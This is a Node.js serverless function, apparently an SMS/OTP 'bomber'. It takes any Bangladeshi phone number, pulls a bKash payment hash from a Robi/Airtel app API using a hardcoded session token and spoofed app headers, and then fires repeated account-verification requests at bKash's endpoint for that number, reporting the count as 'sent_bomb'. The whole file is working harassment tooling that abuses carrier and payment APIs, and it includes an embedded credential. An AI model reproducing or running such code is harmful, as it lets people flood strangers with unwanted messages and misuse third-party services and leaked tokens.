const https = require("https");

module.exports = async (req, res) => {
  if (req.method !== "GET") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const phoneNo = req.query.phoneNo?.trim();
  const amount = parseInt(req.query.amount);

  if (!phoneNo || isNaN(amount)) {
    return res.json({
      error: "❌ Missing parameters! Please enter phone number & amount.",
      credit: "Developer: Tofazzal Hossain",
    });
  }

  if (!/^01[3-9]\d{8}$/.test(phoneNo)) {
    return res.json({
      error: "❌ Invalid phone number! Please remove +880.",
      credit: "Developer: Tofazzal Hossain",
    });
  }

  if (amount < 1 || amount > 10) {
    return res.json({
      error: "❌ Amount should be between 1 and 10.",
      credit: "Developer: Tofazzal Hossain",
    });
  }

  function callFirstAPI() {
    return new Promise((resolve, reject) => {
      const options = {
        hostname: "myairtel.robi.com.bd",
        path: "/api/v2/bkash_direct_charge/prepare",
        method: "GET",
        headers: {
          "User-Agent": "okhttp/4.12.0",
          "Connection": "Keep-Alive",
          "Accept-Encoding": "gzip",
          "token": "eyJhbGciOiJIUzI1NiJ9.eyJwYXlsb2FkIjp7IjAxNjgzODZjMTIzZWRiMmI2NTRjMTk5NDA0ZDMyNzE4IjoiNjIwNzRjNWU0ZDZlOGU3ZWU3MzdhMTNiNTQ0OTY4ZjIiLCIzNGE2ZTVkNjRhZGUxN2VmNGU1MTYxMmM1MGRkNzJmNSI6ImMzMWIzMjM2NGNlMTljYThmY2QxNTBhNDE3ZWNjZTU4In0sImNyZWF0ZV90aW1lIjoiMjAyNS0wMi0yNSAxMDoxNjoyNiArMDYwMCJ9.-sX0bHNjn5HRtqtvN2DN8sJ9SSeF7GEI9f6kGG91dcM",
          "platform": "android",
          "appname": "airtel",
          "locale": "bn",
          "appversion": "7006004",
          "deviceid": "YOUR_DEVICE_ID",
          "Cookie": "BIGipServerpool_myairtel_robi_com_bd=...; TS01a382c8=...",
        },
      };

      const req = https.request(options, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => resolve(JSON.parse(data)));
      });

      req.on("error", (err) => reject({ error: err.message }));
      req.end();
    });
  }

  function callSecondAPI(phoneNo, hashCode, redirectUri) {
    return new Promise((resolve, reject) => {
      const postData = JSON.stringify({
        authClientId: "super_local",
        otp: "",
        phoneNo,
        pin: "",
        hashCode,
        redirectUri,
      });

      const options = {
        hostname: "directcharge.pay.bka.sh",
        path: "/capabilitycore/portal/verifyAccount",
        method: "POST",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36",
          "Accept": "application/json, text/javascript, */*",
          "Content-Type": "application/json",
          "Content-Length": postData.length,
        },
      };

      const req = https.request(options, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => resolve(JSON.parse(data)));
      });

      req.on("error", (err) => reject({ error: err.message }));
      req.write(postData);
      req.end();
    });
  }

  try {
    const firstApiResponse = await callFirstAPI();

    if (firstApiResponse.error || !firstApiResponse.payment_url) {
      return res.json({
        error: "❌ First API Failed or Payment URL Not Found!",
        credit: "Developer: Tofazzal Hossain",
      });
    }

    const urlParams = new URLSearchParams(
      firstApiResponse.payment_url.split("?")[1]
    );
    const hashCode = urlParams.get("hashCode");
    const redirectUri = urlParams.get("redirectUri");

    if (!hashCode || !redirectUri) {
      return res.json({
        error: "❌ hashCode & redirectUri missing in response!",
        credit: "Developer: Tofazzal Hossain",
      });
    }

    const responses = [];
    for (let i = 0; i < amount; i++) {
      const result = await callSecondAPI(phoneNo, hashCode, redirectUri);
      responses.push(result);
    }

    return res.json({
      message: "✅ All requests successful.",
      sent_bomb: `${amount}`,
      responses,
      credit: "Developer: Tofazzal Hossain",
    });
  } catch (err) {
    return res.json({
      error: "❌ Request failed!",
      details: err.message,
      credit: "Developer: Tofazzal Hossain",
    });
  }
};
